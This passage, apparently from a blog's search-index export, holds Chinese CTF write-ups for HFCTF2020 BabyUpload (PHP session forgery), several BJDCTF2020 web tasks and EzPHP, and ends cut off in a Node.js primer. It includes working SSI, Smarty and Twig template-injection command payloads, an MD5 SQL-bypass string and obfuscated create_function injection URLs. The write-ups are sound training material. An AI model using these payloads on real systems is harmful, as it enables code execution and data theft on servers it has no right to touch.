ng?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n这样，就highlight_file出了传递出的f1ag.php\n构造\n`file.php?file=phar://upload/8adc336297a3d5eb2550edc08aa372a8.jpg`\nget请求得到base编码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705121058956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n解码即得flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200705121127588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["phar","代码审计"],"categories":["buu刷题"]},{"title":"HFCTF2020——BabyUpload","url":"/2020/07/04/[HFCTF2020]BabyUpload/","content":"\n平台：https://buuoj.cn\n\n打开靶机给出源码\n```php\n<?php\nerror_reporting(0);\nsession_save_path(\"/var/babyctf/\");\nsession_start();\nrequire_once \"/flag\";\nhighlight_file(__FILE__);\nif($_SESSION['username'] ==='admin')\n{\n    $filename='/var/babyctf/success.txt';\n    if(file_exists($filename)){\n            safe_delete($filename);\n            die($flag);\n    }\n}\nelse{\n    $_SESSION['username'] ='guest';\n}\n$direction = filter_input(INPUT_POST, 'direction');\n$attr = filter_input(INPUT_POST, 'attr');\n$dir_path = \"/var/babyctf/\".$attr;\nif($attr===\"private\"){\n    $dir_path .= \"/\".$_SESSION['username'];\n}\nif($direction === \"upload\"){\n    try{\n        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){\n            throw new RuntimeException('invalid upload');\n        }\n        $file_path = $dir_path.\"/\".$_FILES['up_file']['name'];\n        $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']);\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        @mkdir($dir_path, 0700, TRUE);\n        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){\n            $upload_result = \"uploaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $upload_result = $e->getMessage();\n    }\n} elseif ($direction === \"download\") {\n    try{\n        $filename = basename(filter_input(INPUT_POST, 'filename'));\n        $file_path = $dir_path.\"/\".$filename;\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        if(!file_exists($file_path)) {\n            throw new RuntimeException('file not exist');\n        }\n        header('Content-Type: application/force-download');\n        header('Content-Length: '.filesize($file_path));\n        header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"');\n        if(readfile($file_path)){\n            $download_result = \"downloaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $download_result = $e->getMessage();\n    }\n    exit;\n}\n?>\n```\n##### 分析一下\n前面设置了session存储路径，启动了session并根目录下包含flag\n\n```php\nerror_reporting(0);\nsession_save_path(\"/var/babyctf/\");\nsession_start();\nrequire_once \"/flag\";\n```\n如果session的username是admin，判断/var/babyctf下是否有success.txt，如果存在，删除文件并输出`$flag`。\n否则设置username为guest\n```php\nif($_SESSION['username'] ==='admin')\n{\n    $filename='/var/babyctf/success.txt';\n    if(file_exists($filename)){\n            safe_delete($filename);\n            die($flag);\n    }\n}\nelse{\n    $_SESSION['username'] ='guest'; \n}\n```\n设置两个post参数direction、attr，`$dir_path`拼接路径，若`$attr`为private，在`$dir_path`的基础上再拼接一个username\n```php\n$direction = filter_input(INPUT_POST, 'direction');\n$attr = filter_input(INPUT_POST, 'attr'); \n$dir_path = \"/var/babyctf/\".$attr;\nif($attr===\"private\"){\n    $dir_path .= \"/\".$_SESSION['username'];\n}\n```\n如果direction设置为upload，首先判断是否正常上传，通过则在`$dir_path`下拼接文件名，之后再拼接一个`_`，同时加上文件名的sha256值，之后限制目录穿越，创建相应目录，把文件上传到目录下。\n\n```php\nif($direction === \"upload\"){\n    try{\n        if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){\n            throw new RuntimeException('invalid upload');\n        }\n        $file_path = $dir_path.\"/\".$_FILES['up_file']['name'];\n        $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']);\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        @mkdir($dir_path, 0700, TRUE);\n        if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){\n            $upload_result = \"uploaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $upload_result = $e->getMessage();\n    }\n}\n```\n若direction设置为download，读取上传上来的文件名，拼接为`$file_path`，限制目录穿越，判断是否存在，存在则返回文件内容。\n```php\nelseif ($direction === \"download\") {//如果direction设置为download\n    try{\n        $filename = basename(filter_input(INPUT_POST, 'filename'));\n        $file_path = $dir_path.\"/\".$filename;\n        if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){\n            throw new RuntimeException('invalid file path');\n        }\n        if(!file_exists($file_path)) {\n            throw new RuntimeException('file not exist');\n        }\n        header('Content-Type: application/force-download');\n        header('Content-Length: '.filesize($file_path));\n        header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"');\n        if(readfile($file_path)){\n            $download_result = \"downloaded\";\n        }else{\n            throw new RuntimeException('error while saving');\n        }\n    } catch (RuntimeException $e) {\n        $download_result = $e->getMessage();\n    }\n    exit;\n}\n```\n##### 解题\n可知要获取flag需满足：\n\n> $_SESSION['username'] ==='admin'\n> $filename='/var/babyctf/success.txt'\n\n也就是说我们要伪造自己的username是admin，并创建一个success.txt文件。\n###### 伪造session\nphp的session默认存储文件名是sess_+PHPSESSID的值，我们先看一下session文件内容。\n查看cookie中PHPSESSID\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704135642804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n构造`direction=download&attr=&filename=sess_5373dbeb80f6189c95463d7a6c3881a9`post传入，在返回内容中读到内容\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704135841854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n可以看到还有一个不可见字符，参考[这位师傅的文章](https://blog.spoock.com/2016/10/16/php-serialize-problem/)得知，\n不同的引擎所对应的session的存储方式有\n\n> php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\nphp:存储方式是，键名+竖线+经过serialize()函数序列处理的值\nphp_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值\n\n因此我们可以判断这里session处理器为php_binary，那么我们可以在本地利用php_binary生成我们要伪造的session文件。\n\n```php\n<?php\nini_set('session.serialize_handler', 'php_binary');\nsession_save_path(\"D:\\\\phpstudy_pro\\\\WWW\\\\testphp\\\\\");\nsession_start();\n\n$_SESSION['username'] = 'admin';\n```\n运行生成session文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704141142529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n将文件名改为sess并计算sha256\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704141921228.png)\n这样，如果我们将sess文件上传，服务器储存该文件的文件名就应该是\n`sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`\n用postman将文件传上去\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704143259497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n构造`direction=download&attr=&filename=sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4`看是否上传成功\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070414342564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n这样就实现了伪造\n###### 创建success.txt\n现在还需要创建一个success.txt来满足判断，回到代码\n\n```php\nif($_SESSION['username'] ==='admin')\n{\n    $filename='/var/babyctf/success.txt';\n    if(file_exists($filename)){\n            safe_delete($filename);\n            die($flag);\n    }\n}\n```\nfilename是通过file_exists来判断的，而file_exists函数在php中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704144259520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n文件名设置不了，直接创建目录也符合条件，将`attr`设置为success.txt创建目录，再将sess上传到该目录下即可绕过判断\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704144630905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n可以看到已经上传成功\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020070414471447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n那么现在我们把PHPSESSID改为sess的文件sha256值让session的username为admin\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704144853695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n再刷新一下即可得到flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200704144911244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["代码审计","phpsession伪造"],"categories":["buu刷题"]},{"title":"BJDCTF2020web复现","url":"/2020/07/03/BJD2020_web_wp/","content":"\n二月份的比赛，前几天做ezphp的时候发现有其他web的题目，索性全都复现一下，有些是之前buu做过了\n\n<!-- more -->\n\ndocker环境：https://github.com/BjdsecCA/BJDCTF2020_January\n\n平台：https://buuoj.cn\n\n### ezphp\n\n写在csdn上了，[传送](https://blog.csdn.net/qq_43756333/article/details/107034933)\n\n### easy_md5\n\n打开靶机只有一个提交框\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702214524.png)\n\n输啥都没有反应，抓了个包，返回头里看到hint\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702214824.png)\n\n#### 考点：mysql特性，MD5函数特殊字符串，php强弱类型\n\nphp中MD5函数的处理方式如下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702215403.png)\n\n由于会返回原始二进制格式，我们来看看`ffifdyop`字符串的结果\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702215956.png)\n\n生成了'or'6以及一些不可见字符，那么再结合hint，他本来的语句是\n`select * from 'admin' where password='传入处理后的值'`\n当我们传入`ffifdyop`之后，就会变成\n`select * from 'admin' where password=''or'6xxxxxxx'`\n\n而在mysql中，判断条件时，以数字为开头的字符串会被当做是整型，均会返回1，也就是true\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200702221500.png)\n\n那么password的or判断就接收true并绕过了这个语句。\n\n传入之后跳转到了levels91.php，源码给出了php代码\n\n```php\n<?php\n$a = $GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    header('Location: levell14.php');\n```\n\n一个简单的弱类型，可以利用科学计数法特性提交两个md5后以0e开头的字符串，或者直接变为数组两个NULL相等绕过。\n\n传入之后又跳转到levell14.php，强类型碰撞\n\n```php\n <?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nhighlight_file(__FILE__);\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n} \n```\n\n传入两个md5后值相等的字符串或一样用数组即可。\n\n### mark loves cat\n\ncsdn上写过：[传送](https://blog.csdn.net/qq_43756333/article/details/106466696)\n\n### easy_search\n\n打开靶机一个登录框\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703144841.png)\n\n请求index.php.swp得源码\n\n```php\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n可以看到成功登录的关键，` $admin == substr(md5($_POST['password']),0,6)`，脚本爆破即可\n\n```python\nimport hashlib\n\ndef func(md5_val):\n    for x in range(999999, 100000000):\n        md5_value=hashlib.md5(str(x)).hexdigest()\n        if md5_value[:6]==md5_val:\n            return str(x)\n\nif __name__ == '__main__':\n    print func('6d0bc1')\n```\n\n跑出来结果是202066，登录看看，headers里返回了url\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703145648.png)\n\n访问之后发现会回显username的内容\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703145755.png)\n\n#### 考点：ssi代码执行注入\n\nssi是服务器端包含的意思，就是在html中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。\n\n在这里， shtml文件可以执行 bash 命令，构造`<!--#exec Cmd=\"ls\"-->`即可命令执行，最后在ls ../找到flag文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151212.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151109.png)\n\n直接cat读取即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703151614.png)\n\n### the mystery of ip\n\n打开靶机flag.php会显示出ip，抓包观察到xff头可以控制\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152750.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152726.png)\n\n#### 考点：smarty模板注入\n\n构造`{{2+2}}`会直接得到4\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703152931.png)\n\n猜测为模板注入，尝试读取配置文件构造`{{config}}`发现是smarty模板。\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703153049.png)\n\n```\n{{system('ls')}}或者{if system('ls')}{/if}\n```\n\n都可以执行命令，最后在根目录下找到flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703153851.png)\n\n### Cookie is so stable\n\n打开靶机在flag.php有个提交框会把输入内容输出到网页上\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154618.png)\n\n构造{{2+2}}发现还会返回计算结果4\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154722.png)\n\n#### 考点：Twig模板注入\n\n发现在cookie处\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703154947.png)\n\nuser会把输入的内容存进去，`urldecode(%7B%7B2%2B2%7D%7D)={{2+2}}`,首先了解一下使用的是什么模板，在[csdn师傅的一篇文章](https://blog.csdn.net/u011377996/article/details/86776181)找到流程图\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703155348.png)\n\n输入{{7*7}}成功回显，但Jinja2是基于python的模板引擎，那么只能是Twig了，百度一下Twig的payload\n\n```\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}\n```\n\n由于提交之后cookie会url编码处理，所以提交之后直接把cookie改回来即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703160726.png)\n\n### ZJCTF，不过如此\n\n之前写在csdn上，[传送](https://blog.csdn.net/qq_43756333/article/details/106538180)","tags":["bypass","ssi","ssti"],"categories":["CTF"]},{"title":"BJDCTF2020——EzPHP","url":"/2020/06/30/buu18——[BJDCTF2020]EzPHP/","content":"\n本地复现一下\n复现地址：https://github.com/BjdsecCA/BJDCTF2020_January\n打开靶机来自卡巴斯基网络威胁实时地图，控制台查看源码发现base32，解码得1nD3x.php\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200630103318121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n访问得源码\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0); \n\n$file = \"1nD3x.php\";\n$shana = $_GET['shana'];\n$passwd = $_GET['passwd'];\n$arg = '';\n$code = '';\n\necho \"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>\";\n\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n\n\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n} ?>\nThis is a very simple challenge and if you solve it I will give you a flag. Good Luck!\nfxck you! I hate English!\n```\n有很多匹配和过滤，一层层看\n\n```php\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n```\n匹配了很多必需的关键词，但可以对传入的字符串的进行url编码绕过，因为`$_SERVER['QUERY_STRING']`并不会对字符串url解码，但get传入之后是会解码的，所以可行。\n\n```php\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n```\n禁用http/https协议，第二个if要求`debu=aqua_is_cute`但又匹配了`aqua_is_cute`，由于`preg_match`只匹配第一行，在句尾加上%0a即可绕过\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200630105739618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n\n```php\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n```\n遍历`$_REQUEST`传递给`$value`，匹配`$value`中的大小写字母，这里考察了`$_REQUEST`的优先级特性，`$_REQUEST`同时接受GET和POST的数据，并且POST具有更高的优先值，php的配置文件中做出了说明。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200630110638839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n再post一个debu即可绕过。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200630111805511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n\n```php\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n```\nfile_get_contents函数，用data协议写入绕过\n```php\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n```\n要求`$shana`和`$passwd`的sha1相等但他们本身不相等，sha1()函数是无法处理数组的，如果sha1()的参数为一个数组会报Warning并返回False，因此如果`$shana`和`$passwd`都为数组，都返回false，就满足条件了.\n把目前的payloaod整理一下\n\n```\nget：data://text/plain,debu_debu_aqua&debu=aqua_is_cute\n&shana[]=1&passwd[]=2\npost：file=1&debu=1\n```\nurl编码传入测试\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020063014542772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n那么接着看\n```php\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n}\n```\n匹配了很多关键字和函数，但`$code`和`$arg`都可控，可以利用`$code('', $arg); `进行create_function注入\n构造`flag[code]=create_function&flag[arg]=}代码函数;//`\n这样就是\n```php\nfunction a('',$arg){\n\treturn $arg\n}\n```\n而`$arg`为`}代码函数;//`\n\n```php\nfunction a('',$arg){\n\treturn }代码函数;//\n}\n```\n`}`提前闭合了a()，后面注释把后面的内容又去掉了，因此可以在`}`和`；`中间执行恶意代码\n那么现在考虑得flag.php\n\n> get_defined_vars()用来输出所有变量和值\n\n构造`flag[arg]=}var_dump(get_defined_vars());//&flag[code]=create_function`\n同样base64编码传入测试\n`?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%73%68%61%6e%61%5b%5d=%31&%70%61%73%73%77%64%5b%5d=2&%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67%5b%61%72%67%5d=}%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//`\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200630142425306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n得知真正的flag在rea1fl4g.php\n那么现在就是读取这个文件了\n`require`代替被过滤的`include`，`require()`代替`require \"\"`，所以可以这样构造\n`require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)`\n同样url编码后传入\n由于关键字过滤，我们取反绕过，于是\n`require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))`\n传入\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200630144125316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n解码得真的flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200630144205341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["代码审计"],"categories":["buu刷题"]},{"title":"初识Node.js","url":"/2020/06/28/node/","content":"\n### 什么是Node.js以及为什么要用node.js\n\n通过翻阅官方手册，得到以下信息\n\n> - Node.js 是一个开源与跨平台的 JavaScript 运行时环境。\n> - Node.js 在浏览器外运行 V8 JavaScript 引擎（Google Chrome 的内核）。\n\n由此我们可以简单认为，node.js是一个让JavaScript脱离浏览器之外运行的环境或语言解释器。\n\n其主要具有以下几个特征：\n\n#### 服务器端JavaScript处理\n\nnode.js的出现使得javascript代码实现了脱离客户端执行，与传统的web开发者前端使用js，后端服务器使用另一种语言如php，python相比，node.js给开发者提供了一个编写后端服务器代码的环境，实现了一定程度上的前后端统一，使得开发者无需学习另一门完全不同的语言，其高度的代码复用性，也大大提升了开发者的效率。\n\n#### 单线程\n\n传统的服务器每次一个新用户连到你的网站上时，服务器就得开一个连接。每个连接都需要占一个进程，这些进程大部分时间都是闲着的，因此很容易造成内存浪费，而node.js仅仅使用一个线程。当有用户连接了，就触发一个内部事件，通过非阻塞 I/O、事件驱动机制，使得这种模式正常运转。\n\n#### 非阻断/异步I/O\n\n在传统的单线程处理机制中，在执行了访问数据库代码之后，整个线程都将暂停下来，等待数据库返回结果，才能执行后面的代码。也就是说，I/O阻塞了代码的执行，极大地降低了程序的执行效率。而node.js进行I/O操作的时候，将调取后面其他部分的计算，直至I/O完成，然后再进行原来部分I/O操作后的后续计算。通俗的描述就是在一件事没做完之前不要停下来，继续做下一件。\n\n#### 事件驱动\n\n非阻断I/O需要事件驱动机制的配合才能顺利运转。在Node.js中，客户端请求建立连接，提交数据等行为，会触发相应的事件，服务器只在用户那边有事件发生的时候才响应。接收到请求，就把它关闭然后进行处理，然后去服务下一个请求。这样，保证了非阻断I/O的顺利进行，提升了效率。\n\n通过采用单线程，非阻断I/O，事件驱动的模型，node.js在减少内存开销的同时，也大大提升了处理业务的效率。\n\n### Node.js的使用方法\n\n#### 